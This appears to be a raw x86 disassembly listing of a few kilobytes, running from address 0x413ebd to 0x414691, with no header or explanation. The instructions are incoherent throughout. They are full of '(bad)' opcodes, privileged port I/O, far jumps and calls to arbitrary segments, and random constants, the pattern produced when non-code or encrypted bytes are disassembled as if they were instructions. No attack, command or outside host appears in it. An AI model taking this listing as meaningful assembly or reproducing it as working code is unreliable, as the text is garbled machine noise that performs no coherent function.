  413ebd:	add    BYTE PTR [eax+0x43],bh
  413ec0:	dec    ecx
  413ec1:	xchg   DWORD PTR [edi-0x2d],ebx
  413ec4:	sti    
  413ec5:	repz cdq 
  413ec7:	xchg   DWORD PTR [eax],esi
  413ec9:	dec    eax
  413eca:	sti    
  413ecb:	push   esi
  413ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ecd:	push   ecx
  413ece:	push   edx
  413ecf:	xchg   esp,eax
  413ed0:	adc    al,BYTE PTR [ebp*2+0x330bdbee]
  413ed7:	jo     0x413e9f
  413ed9:	xchg   esp,eax
  413eda:	inc    eax
  413edb:	pop    es
  413edc:	or     DWORD PTR [ecx],edx
  413ede:	push   edi
  413edf:	cmp    al,0x2b
  413ee1:	(bad)  
  413ee2:	int3   
  413ee3:	push   0x68
  413ee5:	fxam   
  413ee7:	rcl    BYTE PTR [esi-0x123e54b4],cl
  413eed:	and    ebp,DWORD PTR [ebx]
  413eef:	mov    bh,0x1c
  413ef1:	scas   al,BYTE PTR es:[edi]
  413ef2:	shl    BYTE PTR [ebx+0x3dfa1dd4],0x19
  413ef9:	push   0x12
  413efb:	and    eax,0x19ad1ae4
  413f00:	ror    DWORD PTR [edx],0x69
  413f03:	jmp    0xa21:0x3ac2db6a
  413f0a:	adc    eax,0x296e7d79
  413f0f:	aam    0x6f
  413f11:	push   edi
  413f12:	and    dl,BYTE PTR [ecx]
  413f14:	dec    ebx
  413f15:	mov    esp,ss
  413f17:	mov    eax,fs
  413f19:	test   DWORD PTR [edi-0x6c960ac0],0x9c488d9a
  413f23:	or     ecx,DWORD PTR [ebx-0x80]
  413f26:	cmp    ah,cl
  413f28:	pop    esp
  413f29:	xor    eax,0xfeee2fa3
  413f2e:	enter  0x3c01,0x9e
  413f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f33:	mov    edx,0xa16b909b
  413f38:	xor    al,0x44
  413f3a:	call   0xab89:0xc5555a7b
  413f41:	push   0xa8e54e99
  413f46:	xor    BYTE PTR [edx],0x45
  413f49:	push   0xffffffbc
  413f4b:	js     0x413f05
  413f4d:	fs ror ebx,1
  413f50:	lds    esp,FWORD PTR [edx]
  413f52:	fild   QWORD PTR [edx-0x7a]
  413f55:	cmp    al,0xf1
  413f57:	lahf   
  413f58:	dec    edx
  413f59:	cmp    edi,edx
  413f5b:	ret    0x7536
  413f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f5f:	add    BYTE PTR [edi],bl
  413f61:	(bad)  
  413f62:	stc    
  413f63:	cmp    al,0x8a
  413f65:	push   cs
  413f66:	push   0xf803a332
  413f6b:	dec    ebx
  413f6c:	or     dl,0x38
  413f6f:	leave  
  413f70:	or     edx,ebx
  413f72:	mov    eax,ds:0x26372704
  413f77:	or     edx,edx
  413f79:	jo     0x413fa5
  413f7b:	jnp    0x413fc5
  413f7d:	inc    ebx
  413f7e:	mov    dl,0xfc
  413f80:	add    DWORD PTR ds:0x4430203c,edx
  413f86:	mov    dl,0xf8
  413f88:	bswap  edi
  413f8a:	pop    edi
  413f8b:	and    ebp,ecx
  413f8d:	stc    
  413f8e:	scas   eax,DWORD PTR es:[edi]
  413f8f:	sbb    BYTE PTR [edx-0x60],ah
  413f92:	imul   esp,esp,0xffffffe5
  413f95:	cld    
  413f96:	mov    cl,0xb4
  413f98:	pop    esi
  413f99:	pop    es
  413f9a:	or     eax,0xc67fbfb2
  413f9f:	imul   ecx,DWORD PTR [edx-0x10bf03e9],0x22205900
  413fa9:	mov    eax,0x39830dce
  413fae:	(bad)  
  413faf:	lahf   
  413fb0:	push   es
  413fb1:	sbb    ch,BYTE PTR [esi+0x6e]
  413fb4:	ds stc 
  413fb6:	icebp  
  413fb7:	in     eax,dx
  413fb8:	xor    ah,BYTE PTR [ecx-0x5763fe9e]
  413fbe:	sbb    ch,0x8c
  413fc1:	mov    ah,0xf7
  413fc3:	in     al,dx
  413fc4:	aam    0xba
  413fc6:	fnstsw WORD PTR [ebx]
  413fc8:	adc    eax,0x6dc66792
  413fcd:	imul   BYTE PTR ds:0x1214fe6d
  413fd3:	pop    ebx
  413fd4:	idiv   BYTE PTR [esi-0x2a09c7fc]
  413fda:	push   cs
  413fdb:	in     eax,0x8b
  413fdd:	xor    ebx,DWORD PTR [ebp-0xb]
  413fe0:	lods   al,BYTE PTR ds:[esi]
  413fe1:	(bad)  
  413fe2:	fcom   st(2)
  413fe4:	mov    esi,0x371a9a84
  413fe9:	leave  
  413fea:	jmp    0xcd81:0xbede8746
  413ff1:	mov    WORD PTR [ecx-0x54],es
  413ff4:	jmp    0x413fd8
  413ff6:	dec    eax
  413ff7:	hlt    
  413ff8:	mov    ebx,0x1f1b9f95
  413ffd:	xor    DWORD PTR [esi+0x1e4294dd],ecx
  414003:	loope  0x413fe7
  414005:	std    
  414006:	stc    
  414007:	and    dl,BYTE PTR [ecx+edx*2+0x4a153ead]
  41400e:	or     ecx,DWORD PTR [ecx]
  414010:	inc    edx
  414011:	jl     0x414003
  414013:	repz rol cl,cl
  414016:	addr16 xor al,0x17
  414019:	sbb    eax,0xd3e7abf2
  41401e:	jno    0x41402c
  414020:	sub    edx,esi
  414022:	mov    al,ds:0xb26d2a86
  414027:	dec    ebx
  414028:	cmp    eax,0x92e05afe
  41402d:	data16 je 0x414011
  414030:	mov    edi,DWORD PTR [ebp-0x3ad08590]
  414036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414037:	rol    BYTE PTR [ebx+0x7d],1
  41403a:	repnz mov esi,0x94588c62
  414040:	loope  0x4140c0
  414042:	pop    esp
  414043:	pop    ss
  414044:	gs pop edx
  414046:	xor    eax,0x71400cc0
  41404b:	add    BYTE PTR [edi-0x20],cl
  41404e:	adc    esp,DWORD PTR [edi+eiz*4-0x6c611e38]
  414055:	in     eax,0x9f
  414057:	mov    ebx,0xa6daa56d
  41405c:	out    0xd3,al
  41405e:	les    ebp,FWORD PTR cs:[ebp+ebx*4-0x37aa22df]
  414066:	scas   al,BYTE PTR es:[edi]
  414067:	sub    DWORD PTR [ecx-0x49],esp
  41406a:	mov    BYTE PTR [edx-0x1647a3ef],bh
  414070:	pop    es
  414071:	mov    eax,ds:0xb6159710
  414076:	xor    al,0xb1
  414078:	jnp    0x41400a
  41407a:	pop    esi
  41407b:	dec    edi
  41407c:	sbb    bh,ch
  41407e:	xchg   edi,eax
  41407f:	pop    ecx
  414080:	daa    
  414081:	xchg   ecx,eax
  414082:	mov    dl,0xf4
  414084:	pop    eax
  414085:	mov    ecx,0xca2c708b
  41408a:	mov    BYTE PTR ds:0xfa6fa3b,0x63
  414091:	push   ebx
  414092:	xor    DWORD PTR [ecx],0x4c
  414095:	pop    DWORD PTR [esi-0x1457d8c4]
  41409b:	dec    eax
  41409c:	aam    0x3a
  41409e:	cld    
  41409f:	aam    0x13
  4140a1:	add    bl,BYTE PTR [ecx]
  4140a3:	lods   eax,DWORD PTR ds:[esi]
  4140a4:	fs pushaw 
  4140a7:	dec    esi
  4140a8:	test   eax,0xb3e2666e
  4140ad:	push   ebp
  4140ae:	mov    dh,0xfc
  4140b0:	jno    0x414107
  4140b2:	xor    ecx,DWORD PTR [edi]
  4140b4:	adc    BYTE PTR [ecx],ch
  4140b6:	retf   
  4140b7:	mov    dh,0x2d
  4140b9:	rcl    DWORD PTR [edx],0xe4
  4140bc:	mov    ds:0xa8ca6841,al
  4140c1:	pop    ds
  4140c2:	(bad)  
  4140c3:	xor    bl,bh
  4140c5:	scas   eax,DWORD PTR es:[edi]
  4140c6:	rol    BYTE PTR [ecx],0xdd
  4140c9:	push   ebp
  4140ca:	sbb    eax,0xae722fa6
  4140cf:	push   esi
  4140d0:	push   0xffffff97
  4140d2:	and    BYTE PTR cs:0x43ef2635,ah
  4140d9:	cmc    
  4140da:	push   ebp
  4140db:	mov    esi,0x151a04c7
  4140e0:	fwait
  4140e1:	sbb    cl,BYTE PTR [edi+ecx*2]
  4140e4:	repz or cl,BYTE PTR [esi-0x33]
  4140e8:	sbb    eax,0x5bccef9
  4140ed:	inc    ebp
  4140ee:	push   es
  4140ef:	pop    esi
  4140f0:	xor    al,0x52
  4140f2:	sbb    BYTE PTR [ebx+0x60],cl
  4140f5:	jns    0x414089
  4140f7:	inc    edi
  4140f8:	pop    ss
  4140f9:	in     al,0x35
  4140fb:	aam    0x1c
  4140fd:	add    eax,0xc7d0667a
  414102:	call   0x75c7:0xfec51f6c
  414109:	int    0xd0
  41410b:	mov    edi,0x90614b4a
  414110:	or     BYTE PTR [ebx+esi*8+0x5d],cl
  414114:	pop    eax
  414115:	jp     0x414187
  414117:	mov    dh,0x34
  414119:	xlat   BYTE PTR ds:[ebx]
  41411a:	and    eax,eax
  41411c:	jno    0x414130
  41411e:	inc    edx
  41411f:	sbb    edi,esi
  414121:	retf   0x3be
  414124:	pop    ebp
  414125:	(bad)  
  414126:	outs   dx,BYTE PTR ds:[esi]
  414127:	sbb    ch,cl
  414129:	mov    eax,ds:0xc8d640f0
  41412e:	mov    esi,DWORD PTR [ecx+0x54]
  414131:	iretw  
  414133:	test   BYTE PTR [ebx+0x44aaf54d],0xb0
  41413a:	xlat   BYTE PTR ds:[ebx]
  41413b:	fs sbb ah,dh
  41413e:	push   0xffffffd2
  414140:	jmp    0x5648:0x653d6676
  414147:	pop    ebp
  414148:	sbb    dl,BYTE PTR ss:[eax]
  41414b:	pop    esi
  41414c:	fcom   QWORD PTR [esi-0x74]
  41414f:	fisttp WORD PTR [ebx]
  414151:	inc    edx
  414152:	ficom  WORD PTR [eax-0x7259325b]
  414158:	jle    0x414146
  41415a:	les    eax,FWORD PTR [ebx-0x605526e]
  414160:	cmp    DWORD PTR [eax-0x67b95b8],ebp
  414166:	pop    es
  414167:	dec    ebp
  414168:	into   
  414169:	push   ecx
  41416a:	test   DWORD PTR [ebx-0x6f782f9d],esi
  414170:	ror    DWORD PTR [ecx+0x50],cl
  414173:	(bad)  
  414174:	dec    eax
  414175:	loope  0x414107
  414177:	pop    edi
  414178:	in     al,0xeb
  41417a:	mov    al,0xe7
  41417c:	adc    ch,BYTE PTR [eax-0x52]
  41417f:	push   esp
  414180:	sahf   
  414181:	cld    
  414182:	call   0x6ac4:0x7255464e
  414189:	setae  BYTE PTR [ebp+0x2f]
  41418d:	cmp    esi,DWORD PTR [edx-0x29]
  414190:	ins    DWORD PTR es:[edi],dx
  414191:	jecxz  0x4141db
  414193:	cmc    
  414194:	mov    ebx,0xf305b509
  414199:	pusha  
  41419a:	jge    0x4141f2
  41419c:	and    DWORD PTR [edi],esi
  41419e:	pop    ecx
  41419f:	cmp    al,0x37
  4141a1:	fsub   QWORD PTR [edi-0x37]
  4141a4:	inc    ecx
  4141a5:	mov    dh,0xd3
  4141a7:	xchg   edx,eax
  4141a8:	or     BYTE PTR [eax-0x63],0xa1
  4141ac:	fimul  DWORD PTR [edx+edi*2-0x7]
  4141b0:	lahf   
  4141b1:	hlt    
  4141b2:	lea    eax,[ebx-0x2de65e47]
  4141b8:	ds (bad) 
  4141ba:	fisttp WORD PTR [edi]
  4141bc:	gs jns 0x41418b
  4141bf:	sub    ecx,DWORD PTR fs:[edi]
  4141c2:	push   esp
  4141c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141c4:	stos   BYTE PTR es:[edi],al
  4141c5:	dec    esi
  4141c6:	sahf   
  4141c7:	daa    
  4141c8:	(bad)  
  4141c9:	jl     0x41420d
  4141cb:	pop    ss
  4141cc:	pop    edx
  4141cd:	(bad)  
  4141ce:	jnp    0x4141a5
  4141d0:	fld    TBYTE PTR [eax]
  4141d2:	mov    ah,0xae
  4141d4:	fcom   QWORD PTR [esi+0x3d]
  4141d7:	nop
  4141d8:	fild   DWORD PTR [edi-0x45]
  4141db:	mov    edx,0x99a0a3ee
  4141e0:	(bad)  
  4141e1:	push   ss
  4141e2:	cmp    DWORD PTR [edx-0x3d],edi
  4141e5:	js     0x4141b1
  4141e7:	test   DWORD PTR [ebx-0x2f6db7e3],esi
  4141ed:	repnz out dx,eax
  4141ef:	(bad)  
  4141f0:	pop    esi
  4141f1:	sar    DWORD PTR ds:0xb472c201,0x8
  4141f8:	clc    
  4141f9:	jge    0x414192
  4141fb:	(bad)  
  4141fd:	push   ecx
  4141fe:	sahf   
  4141ff:	xor    BYTE PTR [ebp+0xd],bh
  414202:	add    ebp,ecx
  414204:	and    eax,esi
  414206:	push   0x779b3b7
  41420b:	idiv   BYTE PTR [edx+0x23]
  41420e:	mov    ebp,0x41e2f2ed
  414213:	and    BYTE PTR [edi],al
  414215:	pop    ecx
  414216:	xchg   DWORD PTR [esi],ecx
  414218:	xchg   ebx,eax
  414219:	inc    eax
  41421a:	outs   dx,BYTE PTR ds:[esi]
  41421b:	mov    DWORD PTR [edx+0xcbc3fb6],eax
  414221:	int3   
  414222:	cld    
  414223:	mov    ds:0x643bda7a,al
  414228:	mov    al,0xd7
  41422a:	repnz int3 
  41422c:	loope  0x4141b2
  41422e:	or     eax,0xa047b251
  414233:	test   al,ah
  414235:	and    DWORD PTR [ebx-0x4243abce],esp
  41423b:	rcr    BYTE PTR [edx],cl
  41423d:	pop    esp
  41423e:	push   ss
  41423f:	stc    
  414240:	mov    ch,0x84
  414242:	into   
  414243:	stos   BYTE PTR es:[edi],al
  414244:	sbb    dl,al
  414246:	imul   esp,edi,0xa8a3b20e
  41424c:	and    ah,0xf3
  41424f:	jbe    0x414251
  414251:	stos   BYTE PTR es:[edi],al
  414252:	(bad)  
  414253:	pop    ss
  414254:	mov    DWORD PTR [edx+0x2e],edx
  414257:	mov    esp,0xc6564184
  41425c:	mov    ebp,edi
  41425e:	mov    al,0x7d
  414260:	jmp    0x7f2c:0xb04d4b99
  414267:	imul   edx,DWORD PTR [edi-0x532b2b45],0x39
  41426e:	and    bh,BYTE PTR [ecx+0x6]
  414271:	push   edx
  414272:	mov    bl,0xb3
  414274:	sbb    DWORD PTR [ebp-0x7c],eax
  414277:	adc    esi,DWORD PTR [ecx-0x62]
  41427a:	mov    dh,0x14
  41427c:	imul   esi,DWORD PTR [esi+0x387be08a],0x4001eb1c
  414286:	out    0x88,al
  414288:	dec    eax
  414289:	mov    eax,0x328d9d8d
  41428e:	int    0xd0
  414290:	inc    edi
  414291:	lods   eax,DWORD PTR ds:[esi]
  414292:	std    
  414293:	or     ebx,DWORD PTR [ebp-0x41]
  414296:	xchg   BYTE PTR [esi+0x397b7ef5],bl
  41429c:	jbe    0x4142b5
  41429e:	lods   eax,DWORD PTR ds:[esi]
  41429f:	cmp    DWORD PTR [edx-0x54],esp
  4142a2:	push   ss
  4142a3:	cmp    DWORD PTR [ebx-0x1e],eax
  4142a6:	sti    
  4142a7:	sub    esi,DWORD PTR [esi+ebx*4]
  4142aa:	inc    esp
  4142ab:	or     BYTE PTR [esi+0x2aa52b77],bl
  4142b1:	and    DWORD PTR [ebp+0x7f],edi
  4142b4:	sti    
  4142b5:	xor    edi,DWORD PTR [ebp+0x14abbd07]
  4142bb:	je     0x414248
  4142bd:	xchg   ch,dh
  4142bf:	loope  0x41433f
  4142c1:	ins    DWORD PTR es:[edi],dx
  4142c2:	push   eax
  4142c3:	cld    
  4142c4:	jmp    0x414277
  4142c6:	xchg   DWORD PTR [edx],edi
  4142c8:	mov    bh,0xa2
  4142ca:	mov    edi,0xf2190315
  4142cf:	out    dx,eax
  4142d0:	adc    eax,0xa4a545a0
  4142d5:	(bad)  
  4142d6:	jl     0x4142ce
  4142d8:	cwde   
  4142d9:	cmp    esp,DWORD PTR [ebx+0x49]
  4142dc:	add    al,0x18
  4142de:	pusha  
  4142df:	sub    BYTE PTR [ecx+esi*1+0x74],bh
  4142e3:	ins    BYTE PTR es:[edi],dx
  4142e4:	outs   dx,DWORD PTR ds:[esi]
  4142e5:	loop   0x41430a
  4142e7:	mov    edx,0xa1fd4c7b
  4142ec:	xor    eax,0x18e098c0
  4142f1:	xor    al,0x87
  4142f3:	mov    bl,0xd2
  4142f5:	fidivr DWORD PTR [ebp+0x46]
  4142f8:	xor    DWORD PTR [esi+edx*2+0x6f],edx
  4142fc:	mov    eax,ds:0x88143134
  414301:	nop
  414302:	jg     0x414300
  414304:	add    BYTE PTR [eax],bl
  414306:	inc    eax
  414307:	mov    al,0x3
  414309:	pop    ebp
  41430a:	adc    esi,esi
  41430c:	add    bl,dl
  41430e:	xchg   ebx,eax
  41430f:	sub    DWORD PTR [eax-0x7f],esi
  414312:	pop    ebp
  414313:	mov    esi,0x252c9a47
  414318:	pop    eax
  414319:	(bad)
  41431c:	xchg   esi,eax
  41431d:	cmp    esi,esp
  41431f:	shr    DWORD PTR [ebx-0x1d],cl
  414322:	xchg   edi,eax
  414323:	cmp    edi,0xffffff91
  414326:	repz mov dh,0xa1
  414329:	mov    ecx,0x6cfecb42
  41432e:	dec    esp
  41432f:	(bad)  
  414330:	rcl    DWORD PTR [ebx-0x4a],1
  414333:	dec    edi
  414334:	out    dx,al
  414335:	push   ds
  414336:	inc    edi
  414337:	jb     0x414331
  414339:	popw   ss
  41433b:	sub    edi,esp
  41433d:	outs   dx,BYTE PTR ds:[esi]
  41433e:	fcom   QWORD PTR ds:0x4d85945f
  414344:	inc    ebx
  414345:	xchg   ecx,eax
  414346:	and    BYTE PTR [edi+0x4e],ch
  414349:	sti    
  41434a:	adc    DWORD PTR es:[ecx+0x12],edx
  41434e:	jge    0x414314
  414350:	fs mov bl,0xd3
  414353:	mov    cl,BYTE PTR [ebp-0x74554b7]
  414359:	sub    ch,ch
  41435b:	xor    eax,0xb9f01a75
  414360:	push   cs
  414361:	ret    
  414362:	sub    eax,0x64af7374
  414367:	scas   al,BYTE PTR es:[edi]
  414368:	jns    0x414394
  41436a:	fiadd  WORD PTR [ecx]
  41436c:	lods   eax,DWORD PTR ds:[esi]
  41436d:	xchg   ecx,eax
  41436e:	lea    ebx,[esi-0x6]
  414371:	lods   al,BYTE PTR ds:[esi]
  414372:	mov    eax,ds:0xb03838a3
  414377:	pop    ebp
  414378:	(bad)  
  414379:	add    eax,0xd983005a
  41437e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41437f:	(bad)  
  414380:	test   BYTE PTR [ebp-0x3c],0x58
  414384:	aam    0xe7
  414386:	pop    ebp
  414387:	sbb    DWORD PTR [edx],ecx
  414389:	cld    
  41438a:	cmp    eax,0x785e1b0e
  41438f:	add    bl,ch
  414391:	lock jmp 0x6c467118
  414397:	push   esi
  414398:	and    al,0xb5
  41439a:	push   eax
  41439b:	push   esi
  41439c:	mov    eax,0xe0909e87
  4143a1:	daa    
  4143a2:	imul   edi,DWORD PTR [esi],0xffffffe2
  4143a5:	dec    ebp
  4143a6:	out    dx,al
  4143a7:	pushf  
  4143a8:	dec    esi
  4143a9:	out    dx,al
  4143aa:	test   BYTE PTR [edi],ch
  4143ac:	enter  0x1cc4,0x6f
  4143b0:	into   
  4143b1:	stos   DWORD PTR es:[edi],eax
  4143b2:	ins    BYTE PTR es:[edi],dx
  4143b3:	ins    DWORD PTR es:[edi],dx
  4143b4:	pop    edx
  4143b5:	jl     0x414374
  4143b7:	sub    esp,DWORD PTR [eax+esi*1]
  4143ba:	(bad)  
  4143bb:	mov    eax,ds:0x950d13a
  4143c0:	and    eax,DWORD PTR [edi-0x771d82ad]
  4143c6:	cmps   DWORD PTR gs:[si],DWORD PTR es:[di]
  4143c9:	add    al,0xb0
  4143cb:	push   edi
  4143cc:	jle    0x41439a
  4143ce:	sbb    DWORD PTR [esp+edi*4],esp
  4143d1:	(bad)  
  4143d2:	(bad)  
  4143d3:	inc    DWORD PTR [edx]
  4143d5:	jmp    0x414408
  4143d7:	ret    
  4143d8:	cmp    DWORD PTR [esi+0x4cd9929],eax
  4143de:	jae    0x414440
  4143e0:	fst    QWORD PTR [si+0x9]
  4143e4:	hlt    
  4143e5:	push   eax
  4143e6:	loope  0x414453
  4143e8:	fcom   DWORD PTR [ecx+0x32a91a04]
  4143ee:	jb     0x414465
  4143f0:	stos   DWORD PTR es:[edi],eax
  4143f1:	mov    al,0x9b
  4143f3:	jecxz  0x4143b7
  4143f5:	xchg   esp,eax
  4143f6:	inc    ebx
  4143f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143f8:	shl    ebp,cl
  4143fa:	inc    esp
  4143fb:	pop    ecx
  4143fc:	fstp   TBYTE PTR [eax]
  4143fe:	mov    esp,DWORD PTR [edx]
  414400:	xchg   DWORD PTR [ebp+edx*2-0x3b478497],ebp
  414407:	jbe    0x4143a2
  414409:	aaa    
  41440a:	dec    ecx
  41440b:	cwde   
  41440c:	in     al,0x63
  41440e:	xchg   esp,eax
  41440f:	mov    bh,0xf2
  414411:	and    esp,esp
  414413:	leave  
  414414:	sbb    esi,edx
  414416:	dec    ebx
  414417:	stc    
  414418:	popf   
  414419:	cdq    
  41441a:	mov    DWORD PTR [edi+edx*4-0x23],0xd4aea480
  414422:	iret   
  414423:	push   edi
  414424:	fisttp QWORD PTR ds:0xbc1ac2da
  41442a:	ss push ds
  41442c:	xor    al,0xb2
  41442e:	les    ebx,FWORD PTR [edx-0x1a88e9b4]
  414434:	sbb    ch,al
  414436:	sbb    bl,bl
  414438:	pop    ecx
  414439:	imul   ebx,esp,0x4574a776
  41443f:	shl    BYTE PTR [edx],0xf9
  414442:	cmp    ebp,DWORD PTR [edx]
  414444:	pop    ecx
  414445:	adc    al,0x87
  414447:	mov    bl,bl
  414449:	lods   al,BYTE PTR ds:[esi]
  41444a:	pushf  
  41444b:	out    dx,al
  41444c:	addr16 pop ebx
  41444e:	ja     0x414494
  414450:	cld    
  414451:	xchg   edi,eax
  414452:	jns    0x41443a
  414454:	sbb    ebx,esp
  414456:	push   esp
  414457:	mov    esi,fs
  414459:	fsub   QWORD PTR [esi]
  41445b:	or     eax,0xb3d7b924
  414460:	mov    DWORD PTR [ebx+0xb153c5b],esp
  414466:	ins    BYTE PTR es:[edi],dx
  414467:	icebp  
  414468:	scas   al,BYTE PTR es:[edi]
  414469:	fdiv   DWORD PTR [ecx-0x6]
  41446c:	push   0x34
  41446e:	add    BYTE PTR [edx+esi*2],0xb
  414472:	das    
  414473:	jl     0x4144d8
  414475:	mov    al,ds:0x3e0fb8f2
  41447a:	ins    DWORD PTR es:[edi],dx
  41447b:	sbb    BYTE PTR [eax+0x2d],cl
  41447e:	mov    WORD PTR [edi+edi*1-0x69],cs
  414482:	jge    0x414436
  414484:	pop    ss
  414485:	cmc    
  414486:	dec    eax
  414487:	rol    DWORD PTR [edi+0x67],cl
  41448a:	mov    al,ds:0xd33c8ce3
  41448f:	hlt    
  414490:	test   DWORD PTR [ebx-0x59],0xb3494ca7
  414497:	xor    eax,0xc8f3a3cc
  41449c:	cmp    BYTE PTR [edx],ah
  41449e:	(bad)  
  41449f:	fiadd  DWORD PTR [bp+di+0x5876]
  4144a4:	adc    ebx,eax
  4144a6:	js     0x41443b
  4144a8:	xchg   ecx,eax
  4144a9:	pop    ebx
  4144aa:	xor    eax,0x6ab5974a
  4144b0:	xor    ebx,DWORD PTR [edi+0x4fa2d1ef]
  4144b6:	(bad)  
  4144b8:	jg     0x414522
  4144ba:	or     eax,ebp
  4144bc:	and    eax,ebp
  4144be:	loope  0x4144ab
  4144c0:	repz dec ecx
  4144c2:	inc    ebx
  4144c3:	sbb    DWORD PTR [bp+di+0x44],esp
  4144c7:	aaa    
  4144c8:	iret   
  4144c9:	mov    BYTE PTR [ebp+0x5a],bh
  4144cc:	or     eax,0x5d8b16f4
  4144d1:	(bad)  
  4144d3:	push   0x73c6c47e
  4144d8:	pop    ecx
  4144d9:	xchg   esi,eax
  4144da:	inc    esp
  4144db:	dec    esi
  4144dc:	push   edx
  4144dd:	shl    BYTE PTR [edx+0x7f61a1f0],1
  4144e3:	jmp    FWORD PTR [eax-0x666835d8]
  4144e9:	jmp    0x8cb09ee
  4144ee:	lods   eax,DWORD PTR ds:[esi]
  4144ef:	les    esi,FWORD PTR ds:0xa6879f13
  4144f5:	mov    DWORD PTR [eax],edx
  4144f7:	jge    0x4144d9
  4144f9:	mov    bh,0xe4
  4144fb:	xchg   edx,eax
  4144fc:	je     0x41455f
  4144fe:	push   es
  4144ff:	cld    
  414500:	rcl    BYTE PTR [ebx+ebx*2-0x7646c252],0xa
  414508:	jmp    0x4d37664b
  41450d:	and    BYTE PTR [edi-0x16cdcdd4],cl
  414513:	adc    ah,BYTE PTR [ecx-0x14]
  414516:	neg    DWORD PTR [edx+ebp*4+0x76]
  41451a:	out    dx,eax
  41451b:	cmp    al,0xb9
  41451d:	mov    cl,0xe4
  41451f:	sbb    eax,0x269e98a4
  414524:	push   0xf139e8c6
  414529:	sbb    BYTE PTR [ecx+edx*1],bh
  41452c:	fst    QWORD PTR [ebx]
  41452e:	xor    al,0xd8
  414530:	inc    ecx
  414531:	add    eax,DWORD PTR fs:[edx+0x61a1dbcb]
  414538:	ja     0x41454a
  41453a:	inc    edx
  41453b:	loopne 0x414591
  41453d:	add    eax,esi
  41453f:	lock or cl,BYTE PTR [esi-0x22]
  414543:	adc    BYTE PTR [edi-0x596a5901],dh
  414549:	mov    edx,0xfc28c0c5
  41454e:	jg     0x4145be
  414550:	adc    dl,BYTE PTR [edx+0x11]
  414553:	dec    edx
  414554:	call   0xd885:0xe183725d
  41455b:	popa   
  41455c:	popf   
  41455d:	retf   0x8c81
  414560:	test   ah,cl
  414562:	shl    bl,0x49
  414565:	fdivr  QWORD PTR [ebx+0x17c5a96f]
  41456b:	into   
  41456c:	pop    edx
  41456d:	pop    ds
  41456e:	rol    BYTE PTR [ebx],1
  414570:	jnp    0x414586
  414572:	mov    esi,0xcf23d0f0
  414577:	sub    cl,BYTE PTR [eax]
  414579:	pop    esi
  41457a:	xor    eax,DWORD PTR ds:0x514b8d4e
  414580:	jb     0x414584
  414582:	push   esi
  414583:	ret    0x8898
  414586:	inc    ebp
  414587:	ins    DWORD PTR es:[edi],dx
  414588:	jmp    0x4145c4
  41458a:	jb     0x4145e5
  41458c:	mov    dl,0x62
  41458e:	es pop esp
  414590:	inc    edx
  414591:	repz mov ds:0xa6282340,eax
  414597:	bound  edi,QWORD PTR [edi+edx*4]
  41459a:	in     eax,dx
  41459b:	fsubr  QWORD PTR [esi+0x467187a3]
  4145a1:	enter  0x59ac,0x8a
  4145a5:	stos   BYTE PTR es:[edi],al
  4145a6:	dec    edx
  4145a7:	aad    0xb8
  4145a9:	add    cl,bl
  4145ab:	inc    edi
  4145ac:	mov    esi,0x5a0a381a
  4145b1:	int    0xae
  4145b3:	nop
  4145b4:	call   0xe734:0x95929a01
  4145bb:	aas    
  4145bc:	xchg   edx,eax
  4145bd:	jl     0x4145e5
  4145bf:	mov    cl,0xfa
  4145c1:	popf   
  4145c2:	ss mov ecx,0xeb80b7d0
  4145c8:	es inc edi
  4145ca:	xchg   esp,eax
  4145cb:	push   edx
  4145cc:	pop    ss
  4145cd:	pop    ss
  4145ce:	push   ds
  4145cf:	xor    esp,ecx
  4145d1:	dec    esi
  4145d2:	or     esp,DWORD PTR ds:0x8bc78256
  4145d8:	aaa    
  4145d9:	mov    ds:0x9a9d761e,al
  4145de:	mov    bl,0xb7
  4145e0:	or     eax,0x6b313915
  4145e5:	jmp    0x101e:0x3a68168a
  4145ec:	out    0xe3,al
  4145ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145ef:	in     al,dx
  4145f0:	mov    edi,0x9c209708
  4145f5:	sub    al,BYTE PTR [esi+0x70f2357e]
  4145fb:	test   al,0xf6
  4145fd:	sahf   
  4145fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145ff:	xchg   esi,eax
  414600:	out    0xab,eax
  414602:	xor    DWORD PTR [edx],esi
  414604:	cmp    bh,BYTE PTR [ebp-0xa89c2a6]
  41460a:	and    DWORD PTR [edx+ecx*8-0x6d0741b5],edi
  414611:	or     BYTE PTR [ebx],ah
  414613:	push   edi
  414614:	repz arpl WORD PTR [edx+esi*1-0x63],bx
  414619:	pusha  
  41461a:	or     ebp,eax
  41461c:	xchg   DWORD PTR [edx-0x60],edi
  41461f:	jge    0x41467d
  414621:	jno    0x414691
  414623:	(bad)  
  414624:	sub    al,0xd7
  414626:	xchg   ecx,eax
  414627:	leave  
  414628:	push   edi
  414629:	mov    al,0x4c
  41462b:	popf   
  41462c:	jb     0x414630
  41462e:	mov    ecx,0x66be4c2a
  414633:	jmp    0x8260b248
  414638:	shl    BYTE PTR ds:0x259effb3,1
  41463e:	pop    ebx
  41463f:	inc    ebx
  414640:	add    ch,BYTE PTR [edx+0x7b]
  414643:	push   ebx
  414644:	mov    bl,BYTE PTR [esi]
  414646:	or     ch,BYTE PTR [eax-0x7e4f7380]
  41464c:	push   0xe597a150
  414651:	lds    edx,FWORD PTR [ebx-0x1f]
  414654:	das    
  414655:	popf   
  414656:	push   esp
  414657:	jl     0x4146a8
  414659:	jae    0x41461b
  41465b:	xor    eax,0x4e31cb11
  414660:	gs shl bh,0xa8
  414664:	push   edx
  414665:	cmp    ebx,DWORD PTR [eax]
  414667:	cld    
  414668:	or     ebp,edx
  41466a:	push   0xffffffde
  41466c:	fbld   TBYTE PTR [ecx-0x67]
  41466f:	mov    al,0x34
  414671:	jecxz  0x4146a8
  414673:	icebp  
  414674:	fldenv [esi+0x1]
  414677:	cld    
  414678:	add    esi,edx
  41467a:	lods   al,BYTE PTR ds:[esi]
  41467b:	aas    
  41467c:	test   eax,0xcd215564
  414681:	or     ecx,0x3a928e0a
  414687:	sub    al,0x41
  414689:	cmp    DWORD PTR [ebp+edi*1-0x32],edx
  41468d:	jmp    0x4146e9
  41468f:	jg     0x41469a
  414691:	xor    edx,0xffffffe5
